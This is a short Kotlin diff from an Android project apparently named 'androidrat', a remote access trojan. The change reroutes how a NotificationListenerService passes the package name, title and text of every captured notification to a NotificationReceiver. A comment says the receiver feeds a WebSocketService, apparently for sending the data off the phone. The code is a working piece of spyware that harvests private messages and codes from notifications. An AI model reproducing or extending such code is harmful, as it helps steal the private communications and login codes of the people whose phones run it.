@@ -6,6 +6,7 @@ import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
 import android.widget.Toast
+import com.nqmgaming.androidrat.receivers.NotificationReceiver
 
 class NotificationListener : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
@@ -18,12 +19,13 @@ class NotificationListener : NotificationListenerService() {
             val title = it.notification.extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
             Log.d("NotificationListener", "Notification received: $packageName - $title - $content")
             // Send notification data to WebSocketService using a broadcast intent
-            val intent = Intent("notification_data").apply {
+            val intent = Intent(applicationContext, NotificationReceiver::class.java).apply {
+                action = "notification_data"
                 putExtra("package_name", packageName)
                 putExtra("notification_content", content)
                 putExtra("notification_title", title)
             }
-            sendBroadcast(intent)
+            applicationContext.sendBroadcast(intent)
         }
 
     }
